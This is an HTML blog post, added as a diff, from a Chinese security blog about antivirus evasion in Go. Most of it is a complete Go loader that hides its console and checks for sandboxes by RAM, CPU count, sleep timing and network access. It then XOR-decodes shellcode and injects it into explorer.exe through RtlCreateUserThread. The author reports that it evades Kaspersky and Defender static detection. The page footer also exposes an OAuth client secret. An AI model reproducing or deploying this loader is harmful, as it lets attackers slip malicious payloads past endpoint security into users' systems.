@@ -1,0 +1,374 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>基于Go的RtlCreateUserThread_API注入explorer.exe(Ⅲ) | Le1a的菜园坝</title>
+<link rel="shortcut icon" href="https://le1a.github.io/favicon.ico?v=1695699802917">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://le1a.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="基于Go的RtlCreateUserThread_API注入explorer.exe(Ⅲ) | Le1a的菜园坝 - Atom Feed" href="https://le1a.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W25ZHLT37K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W25ZHLT37K');
+</script>
+
+
+    <meta name="description" content="完整代码
+package main
+
+import (
+   _ &quot;embed&quot;
+   &quot;encoding/hex&quot;
+   &quot;fmt&quot;
+   &quot;github.com/go..." />
+    <meta name="keywords" content="免杀,Golang" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://le1a.github.io">
+  <img class="avatar" src="https://le1a.github.io/images/avatar.png?v=1695699802917" alt="">
+  </a>
+  <h1 class="site-title">
+    Le1a的菜园坝
+  </h1>
+  <p class="site-description">
+    欢迎来到菜园坝~~~
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/Le1a/" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Le1aaaaa" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              基于Go的RtlCreateUserThread_API注入explorer.exe(Ⅲ)
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-09-05
+              </span>
+              <span>
+                4 min read
+              </span>
+              
+                <a href="https://le1a.github.io/tag/0FG9kkW6t8/" class="post-tag">
+                  # 免杀
+                </a>
+              
+                <a href="https://le1a.github.io/tag/eI9NmbuONN/" class="post-tag">
+                  # Golang
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="完整代码">完整代码</h1>
+<pre><code class="language-go">package main
+
+import (
+   _ &quot;embed&quot;
+   &quot;encoding/hex&quot;
+   &quot;fmt&quot;
+   &quot;github.com/gonutz/ide/w32&quot;
+   ps &quot;github.com/mitchellh/go-ps&quot;
+   &quot;golang.org/x/sys/windows&quot;
+   &quot;net/http&quot;
+   &quot;net/url&quot;
+   &quot;runtime&quot;
+   &quot;strconv&quot;
+   &quot;syscall&quot;
+   &quot;time&quot;
+   &quot;unsafe&quot;
+)
+func Xor(src string) string {
+   var XorKey = []byte{0x74, 0x69, 0x64, 0x65, 0x62, 0x79, 0x70, 0x61, 0x73, 0x73}   //tidesec
+   var result string
+   var s int64
+   j := 0
+   bt := []rune(src)
+   for i := 0; i &lt; len(src)/2; i++ {
+      s, _ = strconv.ParseInt(string(bt[i*2:i*2+2]), 16, 0)
+      result = result + string(byte(s)^XorKey[j])
+      j = (j + 1) % 10
+   }
+   return result
+}
+func ShowConsoleAsync(commandShow uintptr) {
+   console := w32.GetConsoleWindow()
+   if console != 0 {
+      _, consoleProcID := w32.GetWindowThreadProcessId(console)
+      if w32.GetCurrentProcessId() == consoleProcID {
+         w32.ShowWindowAsync(console, commandShow)
+      }
+   }
+}
+//延迟运行
+func timeSleep() (int, error) {
+   startTime := time.Now()
+   time.Sleep(5 * time.Second)
+   endTime := time.Now()
+   sleepTime := endTime.Sub(startTime)
+   if sleepTime &gt;= 5*time.Second {
+      return 1, nil
+   } else {
+      return 0, nil
+   }
+}
+
+//检测物理内存
+func physicalMemory() (int, error) {
+   var mod = syscall.NewLazyDLL(&quot;kernel32.dll&quot;)
+   var proc = mod.NewProc(&quot;GetPhysicallyInstalledSystemMemory&quot;)
+   var mem uint64
+   proc.Call(uintptr(unsafe.Pointer(&amp;mem)))
+   mem = mem / 1048576
+   if mem &lt; 4 {
+      return 0, nil
+   }
+   return 1, nil
+}
+
+//检测CPU核心数，大于四个返回1
+func numberOfCPU() (int, error) {
+   a := runtime.NumCPU()
+   if a &lt; 4 {
+      return 0, nil
+   } else {
+      return 1, nil
+   }
+}
+//检测网络连通性
+func NetworkCheck() (int, error) {
+   u, _ := url.Parse(&quot;https://www.baidu.com/&quot;) //检查网络连通性
+   q := u.Query()
+   u.RawQuery = q.Encode()
+   res, err := http.Get(u.String())
+   resCode := res.StatusCode
+   res.Body.Close()
+   if resCode == 200 {
+      return 1, err
+   }
+   return 0, err
+}
+
+func main() {
+   ShowConsoleAsync(w32.SW_HIDE)
+   resStatus, _ := NetworkCheck()        //检测网络连通性
+   sleeptime, _ := timeSleep()           //延迟运行是否成功
+   physicalMemory, _ := physicalMemory() //物理内存是否大于4g，大于4g返回1
+   cpuNumber, _ := numberOfCPU()         //cpu核心数量，大于4返回1
+   if resStatus == 1 &amp;&amp; sleeptime == 1 &amp;&amp; physicalMemory == 1 &amp;&amp; cpuNumber == 1 {
+      var sc = &quot;Xor之后的shellcode&quot;
+      scxor := Xor(sc)
+      shellcode, _ := hex.DecodeString(scxor)
+      processList, err := ps.Processes()
+      if err != nil {
+         return
+      }
+      var pid int
+      for _, process := range processList {
+         if process.Executable() == &quot;explorer.exe&quot; {
+            pid = process.Pid()
+            break
+         }
+      }
+      kernel32 := windows.NewLazySystemDLL(&quot;kernel32.dll&quot;)
+      ntdll := windows.NewLazySystemDLL(&quot;ntdll.dll&quot;)
+      OpenProcess := kernel32.NewProc(&quot;OpenProcess&quot;)
+      VirtualAllocEx := kernel32.NewProc(&quot;VirtualAllocEx&quot;)
+      VirtualProtectEx := kernel32.NewProc(&quot;VirtualProtectEx&quot;)
+      WriteProcessMemory := kernel32.NewProc(&quot;WriteProcessMemory&quot;)
+      RtlCreateUserThread := ntdll.NewProc(&quot;RtlCreateUserThread&quot;)
+      CloseHandle := kernel32.NewProc(&quot;CloseHandle&quot;)
+      pHandle, _, _ := OpenProcess.Call(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|
+         windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION,
+         0, uintptr(uint32(pid)))
+      addr, _, _ := VirtualAllocEx.Call(pHandle, 0, uintptr(len(shellcode)),
+         windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+      fmt.Println(&quot;ok&quot;)
+      _, _, _ = WriteProcessMemory.Call(pHandle, addr, (uintptr)(unsafe.Pointer(&amp;shellcode[0])),
+         uintptr(len(shellcode)))
+      oldProtect := windows.PAGE_READWRITE
+      _, _, _ = VirtualProtectEx.Call(pHandle, addr, uintptr(len(shellcode)),
+         windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&amp;oldProtect)))
+      var tHandle uintptr
+      _, _, _ = RtlCreateUserThread.Call(pHandle, 0, 0, 0, 0, 0, addr, 0,
+         uintptr(unsafe.Pointer(&amp;tHandle)), 0)
+      _, _, _ = CloseHandle.Call(uintptr(uint32(pHandle)))
+   }
+}
+</code></pre>
+<h1 id="免杀效果">免杀效果</h1>
+<p>卡巴斯基 静态动态都过了，Defender静态也过了，但是动态还是会被杀...🤣🤣🤣</p>
+<p>VT没敢丢上去，怕一直上线....</p>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/05/16c13a9462087.png" alt="image-20220905225405509" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/05/703ca23be7ce8.png" alt="image-20220905225418631" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/05/5fc0ec105bffe.png" alt="image-20220905221106569" loading="lazy"></figure>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%AE%8C%E6%95%B4%E4%BB%A3%E7%A0%81">完整代码</a></li>
+<li><a href="#%E5%85%8D%E6%9D%80%E6%95%88%E6%9E%9C">免杀效果</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://le1a.github.io/post/基于Go实现沙箱检测和条件触发/">
+              <h3 class="post-title">
+                基于Go实现沙箱检测和条件触发(Ⅱ)
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '883f90be69914455ab35',
+    clientSecret: '11fe2e13c68d9461524a00a6ad7ba52b6bc6b49b',
+    repo: 'Le1a.github.io',
+    owner: 'Le1a',
+    admin: ['Le1a'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://le1a.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
